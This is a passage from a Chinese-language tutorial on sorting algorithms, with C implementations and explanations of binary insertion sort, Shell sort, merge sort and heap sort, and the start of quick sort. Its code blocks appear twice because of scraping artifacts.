,6,,, ,5,,, ,3,,, ,1,,, ,8,,, ,7,,, ,2,,, ,4, ,},;,// 从小到大插入排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,InsertionSort,(,A,,, ,n,),;,    ,printf,(,\"插入排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行插入排序的实现过程如下,\n,\n,使用插入排序为一列数字进行排序的宏观过程：,\n,\n,插入排序不适合对于数据量比较大的排序应用。但是，如果需要排序的数据量很小，比如量级小于千，那么插入排序还是一个不错的选择。 插入排序在工业级库中也有着广泛的应用，在STL的sort算法和stdlib的qsort算法中，都将插入排序作为快速排序的补充，用于少量元素的排序（通常为8个或以下）。,\n,插入排序的改进：二分插入排序,\n,对于插入排序，如果比较操作的代价比交换操作大的话，可以采用,二分查找法,来减少比较操作的次数，我们称为,二分插入排序,，代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid InsertionSortDichotomy(int A[], int n)\r\n{\r\n    for (int i = 1; i < n; i++)\r\n    {\r\n        int get = A[i];                    // 右手抓到一张扑克牌\r\n        int left = 0;                    // 拿在左手上的牌总是排序好的，所以可以用二分法\r\n        int right = i - 1;                // 手牌左右边界进行初始化\r\n        while (left <= right)            // 采用二分法定位新牌的位置\r\n        {\r\n            int mid = (left + right) / 2;\r\n            if (A[mid] > get)\r\n                right = mid - 1;\r\n            else\r\n                left = mid + 1;\r\n        }\r\n        for (int j = i - 1; j >= left; j--)    // 将欲插入新牌位置右边的牌整体向右移动一个单位\r\n        {\r\n            A[j + 1] = A[j];\r\n        }\r\n        A[left] = get;                    // 将抓到的牌插入手牌\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大二分插入排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    InsertionSortDichotomy(A, n);\r\n    printf(\"二分插入排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(n^2),// 最优时间复杂度 ---- O(nlogn),// 平均时间复杂度 ---- O(n^2),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 稳定, ,void, ,InsertionSortDichotomy,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,int, ,get, ,=, ,A,[,i,],;,                    ,// 右手抓到一张扑克牌,        ,int, ,left, ,=, ,0,;,                    ,// 拿在左手上的牌总是排序好的，所以可以用二分法,        ,int, ,right, ,=, ,i, ,-, ,1,;,                ,// 手牌左右边界进行初始化,        ,while, ,(,left, ,<=, ,right,),            ,// 采用二分法定位新牌的位置,        ,{,            ,int, ,mid, ,=, ,(,left, ,+, ,right,), ,/, ,2,;,            ,if, ,(,A,[,mid,], ,>, ,get,),                ,right, ,=, ,mid, ,-, ,1,;,            ,else,                ,left, ,=, ,mid, ,+, ,1,;,        ,},        ,for, ,(,int, ,j, ,=, ,i, ,-, ,1,;, ,j, ,>=, ,left,;, ,j,--,),    ,// 将欲插入新牌位置右边的牌整体向右移动一个单位,        ,{,            ,A,[,j, ,+, ,1,], ,=, ,A,[,j,],;,        ,},        ,A,[,left,], ,=, ,get,;,                    ,// 将抓到的牌插入手牌,    ,},}, , ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,5,,, ,2,,, ,9,,, ,4,,, ,7,,, ,6,,, ,1,,, ,3,,, ,8, ,},;,// 从小到大二分插入排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,InsertionSortDichotomy,(,A,,, ,n,),;,    ,printf,(,\"二分插入排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当n较大时，二分插入排序的比较次数比直接插入排序的最差情况好得多，但比直接插入排序的最好情况要差，所当以元素初始序列已经接近升序时，直接插入排序比二分插入排序比较次数少。二分插入排序元素移动次数与直接插入排序相同，依赖于元素初始序列。,\n,插入排序的更高效改进：希尔排序(Shell Sort),\n,希尔排序，也叫,递减增量排序,，是插入排序的一种更高效的改进版本。希尔排序是,不稳定,的排序算法。,\n,希尔排序是基于插入排序的以下两点性质而提出改进方法的：,\n,\n,插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率,\n,但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位,\n,\n,希尔排序通过将比较的全部元素分为几个区域来提升插入排序的性能。这样可以让一个元素可以一次性地朝最终位置前进一大步。然后算法再取越来越小的步长进行排序，算法的最后一步就是普通的插入排序，但是到了这步，需排序的数据几乎是已排好的了（此时插入排序较快）。,\n假设有一个很小的数据在一个已按升序排好序的数组的末端。如果用复杂度为O(n^2)的排序（冒泡排序或直接插入排序），可能会进行n次的比较和交换才能将该数据移至正确位置。而希尔排序会用较大的步长移动数据，所以小数据只需进行少数比较和交换即可到正确位置。,\n,希尔排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>  \r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- 根据步长序列的不同而不同。已知最好的为O(n(logn)^2)\r\n// 最优时间复杂度 ---- O(n)\r\n// 平均时间复杂度 ---- 根据步长序列的不同而不同。\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\nvoid ShellSort(int A[], int n)\r\n{\r\n    int h = 0;\r\n    while (h <= n)                          // 生成初始增量\r\n    {\r\n        h = 3 * h + 1;\r\n    }\r\n    while (h >= 1)\r\n    {\r\n        for (int i = h; i < n; i++)\r\n        {\r\n            int j = i - h;\r\n            int get = A[i];\r\n            while (j >= 0 && A[j] > get)\r\n            {\r\n                A[j + h] = A[j];\r\n                j = j - h;\r\n            }\r\n            A[j + h] = get;\r\n        }\r\n        h = (h - 1) / 3;                    // 递减增量\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大希尔排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    ShellSort(A, n);\r\n    printf(\"希尔排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>  , ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- 根据步长序列的不同而不同。已知最好的为O(n(logn)^2),// 最优时间复杂度 ---- O(n),// 平均时间复杂度 ---- 根据步长序列的不同而不同。,// 所需辅助空间 ------ O(1),// 稳定性 ------------ 不稳定, ,void, ,ShellSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,int, ,h, ,=, ,0,;,    ,while, ,(,h, ,<=, ,n,),                          ,// 生成初始增量,    ,{,        ,h, ,=, ,3, ,*, ,h, ,+, ,1,;,    ,},    ,while, ,(,h, ,>=, ,1,),    ,{,        ,for, ,(,int, ,i, ,=, ,h,;, ,i, ,<, ,n,;, ,i,++,),        ,{,            ,int, ,j, ,=, ,i, ,-, ,h,;,            ,int, ,get, ,=, ,A,[,i,],;,            ,while, ,(,j, ,>=, ,0, ,&&, ,A,[,j,], ,>, ,get,),            ,{,                ,A,[,j, ,+, ,h,], ,=, ,A,[,j,],;,                ,j, ,=, ,j, ,-, ,h,;,            ,},            ,A,[,j, ,+, ,h,], ,=, ,get,;,        ,},        ,h, ,=, ,(,h, ,-, ,1,), ,/, ,3,;,                    ,// 递减增量,    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,5,,, ,2,,, ,9,,, ,4,,, ,7,,, ,6,,, ,1,,, ,3,,, ,8, ,},;,// 从小到大希尔排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,ShellSort,(,A,,, ,n,),;,    ,printf,(,\"希尔排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,以23, 10, 4, 1的步长序列进行希尔排序：,\n,\n,希尔排序是不稳定的排序算法，,虽然一次插入排序是稳定的，不会改变相同元素的相对顺序，但在不同的插入排序过程中，相同的元素可能在各自的插入排序中移动，最后其稳定性就会被打乱。,\n,比如序列：{ 3, 5, 10, 8, 7, 2, 8, 1, 20, 6 }，h=2时分成两个子序列 { 3, 10, 7, 8, 20 } 和  { 5, 8, 2, 1, 6 } ，未排序之前第二个子序列中的8在前面，现在对两个子序列进行插入排序，得到 { 3, 7, 8, 10, 20 } 和 { 1, 2, 5, 6, 8 } ，即 { 3, 1, 7, 2, 8, 5, 10, 6, 20, 8 } ，两个8的相对次序发生了改变。,\n,归并排序(Merge Sort),\n,归并排序是创建在归并操作上的一种有效的排序算法，效率为O(nlogn)，1945年由冯·诺伊曼首次提出。,\n,归并排序的实现分为,递归实现,与,非递归(迭代)实现,。递归实现的归并排序是算法设计中分治策略的典型应用，我们将一个大问题分割成小问题分别解决，然后用所有小问题的答案来解决整个大问题。非递归(迭代)实现的归并排序首先进行是两两归并，然后四四归并，然后是八八归并，一直下去直到归并了整个数组。,\n,归并排序算法主要依赖归并(Merge)操作。归并操作指的是将两个已经排序的序列合并成一个序列的操作，,归并操作,步骤如下：,\n,\n,申请空间,，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列,\n,设定两个指针，最初位置分别为两个已经排序序列的起始位置,\n,比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置,\n,重复步骤3直到某一指针到达序列尾,\n,将另一序列剩下的所有元素直接复制到合并序列尾,\n,\n,归并排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n#include <limits.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ O(n)\r\n// 稳定性 ------------ 稳定\r\n\r\n\r\nvoid Merge(int A[], int left, int mid, int right)// 合并两个已排好序的数组A[left...mid]和A[mid+1...right]\r\n{\r\n    int len = right - left + 1;\r\n    int *temp = new int[len];       // 辅助空间O(n)\r\n    int index = 0;\r\n    int i = left;                   // 前一数组的起始元素\r\n    int j = mid + 1;                // 后一数组的起始元素\r\n    while (i <= mid && j <= right)\r\n    {\r\n        temp[index++] = A[i] <= A[j] ? A[i++] : A[j++];  // 带等号保证归并排序的稳定性\r\n    }\r\n    while (i <= mid)\r\n    {\r\n        temp[index++] = A[i++];\r\n    }\r\n    while (j <= right)\r\n    {\r\n        temp[index++] = A[j++];\r\n    }\r\n    for (int k = 0; k < len; k++)\r\n    {\r\n        A[left++] = temp[k];\r\n    }\r\n}\r\n\r\nvoid MergeSortRecursion(int A[], int left, int right)    // 递归实现的归并排序(自顶向下)\r\n{\r\n    if (left == right)    // 当待排序的序列长度为1时，递归开始回溯，进行merge操作\r\n        return;\r\n    int mid = (left + right) / 2;\r\n    MergeSortRecursion(A, left, mid);\r\n    MergeSortRecursion(A, mid + 1, right);\r\n    Merge(A, left, mid, right);\r\n}\r\n\r\nvoid MergeSortIteration(int A[], int len)    // 非递归(迭代)实现的归并排序(自底向上)\r\n{\r\n    int left, mid, right;// 子数组索引,前一个为A[left...mid]，后一个子数组为A[mid+1...right]\r\n    for (int i = 1; i < len; i *= 2)        // 子数组的大小i初始为1，每轮翻倍\r\n    {\r\n        left = 0;\r\n        while (left + i < len)              // 后一个子数组存在(需要归并)\r\n        {\r\n            mid = left + i - 1;\r\n            right = mid + i < len ? mid + i : len - 1;// 后一个子数组大小可能不够\r\n            Merge(A, left, mid, right);\r\n            left = right + 1;               // 前一个子数组索引向后移动\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A1[] = { 6, 5, 3, 1, 8, 7, 2, 4 };      // 从小到大归并排序\r\n    int A2[] = { 6, 5, 3, 1, 8, 7, 2, 4 };\r\n    int n1 = sizeof(A1) / sizeof(int);\r\n    int n2 = sizeof(A2) / sizeof(int);\r\n    MergeSortRecursion(A1, 0, n1 - 1);          // 递归实现\r\n    MergeSortIteration(A2, n2);                 // 非递归实现\r\n    printf(\"递归实现的归并排序结果：\");\r\n    for (int i = 0; i < n1; i++)\r\n    {\r\n        printf(\"%d \", A1[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    printf(\"非递归实现的归并排序结果：\");\r\n    for (int i = 0; i < n2; i++)\r\n    {\r\n        printf(\"%d \", A2[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>,#include <limits.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(nlogn),// 最优时间复杂度 ---- O(nlogn),// 平均时间复杂度 ---- O(nlogn),// 所需辅助空间 ------ O(n),// 稳定性 ------------ 稳定, , ,void, ,Merge,(,int, ,A,[,],,, ,int, ,left,,, ,int, ,mid,,, ,int, ,right,),// 合并两个已排好序的数组A[left...mid]和A[mid+1...right],{,    ,int, ,len, ,=, ,right, ,-, ,left, ,+, ,1,;,    ,int, ,*,temp, ,=, ,new, ,int,[,len,],;,       ,// 辅助空间O(n),    ,int, ,index, ,=, ,0,;,    ,int, ,i, ,=, ,left,;,                   ,// 前一数组的起始元素,    ,int, ,j, ,=, ,mid, ,+, ,1,;,                ,// 后一数组的起始元素,    ,while, ,(,i, ,<=, ,mid, ,&&, ,j, ,<=, ,right,),    ,{,        ,temp,[,index,++,], ,=, ,A,[,i,], ,<=, ,A,[,j,], ,?, ,A,[,i,++,], ,:, ,A,[,j,++,],;,  ,// 带等号保证归并排序的稳定性,    ,},    ,while, ,(,i, ,<=, ,mid,),    ,{,        ,temp,[,index,++,], ,=, ,A,[,i,++,],;,    ,},    ,while, ,(,j, ,<=, ,right,),    ,{,        ,temp,[,index,++,], ,=, ,A,[,j,++,],;,    ,},    ,for, ,(,int, ,k, ,=, ,0,;, ,k, ,<, ,len,;, ,k,++,),    ,{,        ,A,[,left,++,], ,=, ,temp,[,k,],;,    ,},}, ,void, ,MergeSortRecursion,(,int, ,A,[,],,, ,int, ,left,,, ,int, ,right,),    ,// 递归实现的归并排序(自顶向下),{,    ,if, ,(,left, ,==, ,right,),    ,// 当待排序的序列长度为1时，递归开始回溯，进行merge操作,        ,return,;,    ,int, ,mid, ,=, ,(,left, ,+, ,right,), ,/, ,2,;,    ,MergeSortRecursion,(,A,,, ,left,,, ,mid,),;,    ,MergeSortRecursion,(,A,,, ,mid, ,+, ,1,,, ,right,),;,    ,Merge,(,A,,, ,left,,, ,mid,,, ,right,),;,}, ,void, ,MergeSortIteration,(,int, ,A,[,],,, ,int, ,len,),    ,// 非递归(迭代)实现的归并排序(自底向上),{,    ,int, ,left,,, ,mid,,, ,right,;,// 子数组索引,前一个为A[left...mid]，后一个子数组为A[mid+1...right],    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,len,;, ,i *,=, ,2,),        ,// 子数组的大小i初始为1，每轮翻倍,    ,{,        ,left, ,=, ,0,;,        ,while, ,(,left, ,+, ,i, ,<, ,len,),              ,// 后一个子数组存在(需要归并),        ,{,            ,mid, ,=, ,left, ,+, ,i, ,-, ,1,;,            ,right, ,=, ,mid, ,+, ,i, ,<, ,len, ,?, ,mid, ,+, ,i, ,:, ,len, ,-, ,1,;,// 后一个子数组大小可能不够,            ,Merge,(,A,,, ,left,,, ,mid,,, ,right,),;,            ,left, ,=, ,right, ,+, ,1,;,               ,// 前一个子数组索引向后移动,        ,},    ,},}, ,int, ,main,(,),{,    ,int, ,A1,[,], ,=, ,{, ,6,,, ,5,,, ,3,,, ,1,,, ,8,,, ,7,,, ,2,,, ,4, ,},;,      ,// 从小到大归并排序,    ,int, ,A2,[,], ,=, ,{, ,6,,, ,5,,, ,3,,, ,1,,, ,8,,, ,7,,, ,2,,, ,4, ,},;,    ,int, ,n1, ,=, ,sizeof,(,A1,), ,/, ,sizeof,(,int,),;,    ,int, ,n2, ,=, ,sizeof,(,A2,), ,/, ,sizeof,(,int,),;,    ,MergeSortRecursion,(,A1,,, ,0,,, ,n1, ,-, ,1,),;,          ,// 递归实现,    ,MergeSortIteration,(,A2,,, ,n2,),;,                 ,// 非递归实现,    ,printf,(,\"递归实现的归并排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n1,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A1,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,printf,(,\"非递归实现的归并排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n2,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A2,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行归并排序的实例如下,\n,\n,使用归并排序为一列数字进行排序的宏观过程：,\n,\n,归并排序除了可以对数组进行排序，还可以高效的求出数组小和（即单调和）以及数组中的逆序对，详见这篇,博文,。,\n,堆排序(Heap Sort),\n,堆排序是指利用堆这种数据结构所设计的一种选择排序算法。堆是一种近似完全二叉树的结构（通常堆是通过一维数组来实现的），并满足性质：以最大堆（也叫大根堆、大顶堆）为例，其中父结点的值总是大于它的孩子节点。,\n,我们可以很容易的定义堆排序的过程：,\n,\n,由输入的无序数组构造一个最大堆，作为初始的无序区,\n,把堆顶元素（最大值）和堆尾元素互换,\n,把堆（无序区）的尺寸缩小1，并调用heapify(A, 0)从新的堆顶元素开始进行堆调整,\n,重复步骤2，直到堆的尺寸为1,\n,\n,堆排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid Heapify(int A[], int i, int size)  // 从A[i]向下进行堆调整\r\n{\r\n    int left_child = 2 * i + 1;         // 左孩子索引\r\n    int right_child = 2 * i + 2;        // 右孩子索引\r\n    int max = i;                        // 选出当前结点与其左右孩子三者之中的最大值\r\n    if (left_child < size && A[left_child] > A[max])\r\n        max = left_child;\r\n    if (right_child < size && A[right_child] > A[max])\r\n        max = right_child;\r\n    if (max != i)\r\n    {\r\n        Swap(A, i, max);                // 把当前结点和它的最大(直接)子节点进行交换\r\n        Heapify(A, max, size);          // 递归调用，继续从当前结点向下进行堆调整\r\n    }\r\n}\r\n\r\nint BuildHeap(int A[], int n)           // 建堆，时间复杂度O(n)\r\n{\r\n    int heap_size = n;\r\n    for (int i = heap_size / 2 - 1; i >= 0; i--) // 从每一个非叶结点开始向下进行堆调整\r\n        Heapify(A, i, heap_size);\r\n    return heap_size;\r\n}\r\n\r\nvoid HeapSort(int A[], int n)\r\n{\r\n    int heap_size = BuildHeap(A, n);    // 建立一个最大堆\r\n    while (heap_size > 1)    　　　　　　 // 堆（无序区）元素个数大于1，未完成排序\r\n    {\r\n        // 将堆顶元素与堆的最后一个元素互换，并从堆中去掉最后一个元素\r\n        // 此处交换操作很有可能把后面元素的稳定性打乱，所以堆排序是不稳定的排序算法\r\n        Swap(A, 0, --heap_size);\r\n        Heapify(A, 0, heap_size);     // 从新的堆顶元素开始向下进行堆调整，时间复杂度O(logn)\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大堆排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    HeapSort(A, n);\r\n    printf(\"堆排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(nlogn),// 最优时间复杂度 ---- O(nlogn),// 平均时间复杂度 ---- O(nlogn),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 不稳定, , ,void, ,Swap,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,j,),{,    ,int, ,temp, ,=, ,A,[,i,],;,    ,A,[,i,], ,=, ,A,[,j,],;,    ,A,[,j,], ,=, ,temp,;,}, ,void, ,Heapify,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,size,),  ,// 从A[i]向下进行堆调整,{,    ,int, ,left_child, ,=, ,2, ,*, ,i, ,+, ,1,;,         ,// 左孩子索引,    ,int, ,right_child, ,=, ,2, ,*, ,i, ,+, ,2,;,        ,// 右孩子索引,    ,int, ,max, ,=, ,i,;,                        ,// 选出当前结点与其左右孩子三者之中的最大值,    ,if, ,(,left_child, ,<, ,size, ,&&, ,A,[,left_child,], ,>, ,A,[,max,],),        ,max, ,=, ,left_child,;,    ,if, ,(,right_child, ,<, ,size, ,&&, ,A,[,right_child,], ,>, ,A,[,max,],),        ,max, ,=, ,right_child,;,    ,if, ,(,max, ,!=, ,i,),    ,{,        ,Swap,(,A,,, ,i,,, ,max,),;,                ,// 把当前结点和它的最大(直接)子节点进行交换,        ,Heapify,(,A,,, ,max,,, ,size,),;,          ,// 递归调用，继续从当前结点向下进行堆调整,    ,},}, ,int, ,BuildHeap,(,int, ,A,[,],,, ,int, ,n,),           ,// 建堆，时间复杂度O(n),{,    ,int, ,heap_size, ,=, ,n,;,    ,for, ,(,int, ,i, ,=, ,heap_size, ,/, ,2, ,-, ,1,;, ,i, ,>=, ,0,;, ,i,--,), ,// 从每一个非叶结点开始向下进行堆调整,        ,Heapify,(,A,,, ,i,,, ,heap_size,),;,    ,return, ,heap_size,;,}, ,void, ,HeapSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,int, ,heap_size, ,=, ,BuildHeap,(,A,,, ,n,),;,    ,// 建立一个最大堆,    ,while, ,(,heap_size, ,>, ,1,),    ,　　　　　　, ,// 堆（无序区）元素个数大于1，未完成排序,    ,{,        ,// 将堆顶元素与堆的最后一个元素互换，并从堆中去掉最后一个元素,        ,// 此处交换操作很有可能把后面元素的稳定性打乱，所以堆排序是不稳定的排序算法,        ,Swap,(,A,,, ,0,,, ,--,heap_size,),;,        ,Heapify,(,A,,, ,0,,, ,heap_size,),;,     ,// 从新的堆顶元素开始向下进行堆调整，时间复杂度O(logn),    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,5,,, ,2,,, ,9,,, ,4,,, ,7,,, ,6,,, ,1,,, ,3,,, ,8, ,},;,// 从小到大堆排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,HeapSort,(,A,,, ,n,),;,    ,printf,(,\"堆排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,堆排序算法的演示：,\n,\n,动画中在排序过程之前简单的表现了创建堆的过程以及堆的逻辑结构。,\n,堆排序是不稳定的排序算法，不稳定发生在堆顶元素与A[i]交换的时刻。,\n,比如序列：{ 9, 5, 7, 5 }，堆顶元素是9，堆排序下一步将9和第二个5进行交换，得到序列 { 5, 5, 7, 9 }，再进行堆调整得到{ 7, 5, 5, 9 }，重复之前的操作最后得到{ 5, 5, 7, 9 }从而改变了两个5的相对次序。,\n,快速排序(Quick Sort),\n,快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序n个元素要O(nlogn)次比较。在最坏状况下则需要O(n^2)次比较，但这种状况并不常见。事实上，快速排序通常明显比其他O(nlogn)算法更快，因为它的内部循环可以在大部分的架构上很有效率地被实现出来。,\n,快速排序使用分治策略(Divide and Conquer)来把一个序列分为两个子序列。步骤为：,\n,\n,从序列中挑出一个元素，作为”基准”(pivot).,\n,把所有比基准值小的元素放在基准前面，所有比基准值大的元素放在基准的后面（相同的数可以到任一边），这个称为分区(partition)操作。,\n,对每个分区递归地进行步骤1~2，递归的结束条件是序列的大小是0或1，这时整体已经被排好序了。,\n,\n,快速排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 ------------ 内部比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- 每次选取的基准都是最大（或最小）的元素，导致每次只划分出了一个分区，需要进行n-1次划分才能结束递归，时间复杂度为O(n^2)\r\n// 最优时间复杂度 ---- 每次选取的基准都是中位数，这样每次都均匀的划分出两个分区，只需要logn次划分就能结束递归，时间复杂度为O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ 主要是递归造成的栈空间的使用(用来保存left和right等局部变量)，取决于递归树的深度，一般为O(logn)，最差为O(n)       \r\n// 稳定性 ---------- 不稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nint Partition(int A[], int left, int right)  // 划分函数\r\n{\r\n    int pivot = A[right];               // 这里每次都选择最后一个元素作为基准\r\n    int tail = left - 1;                // tail为小于基准的子数组最后一个元素的索引\r\n    for (int i = left; i < right; i++)  // 遍历基准以外的其他元素\r\n    {\r\n        if (A[i] <= pivot)              // 把小于等于基准的元素放到前一个子数组末尾\r\n        {\r\n            Swap(A, ++tail, i);\r\n        }\r\n    }\r\n    Swap(A, tail + 1, right);           // 最后把基准放到前一个子数组的后边，剩下的子数组既是大于基准的子数组\r\n                                        // 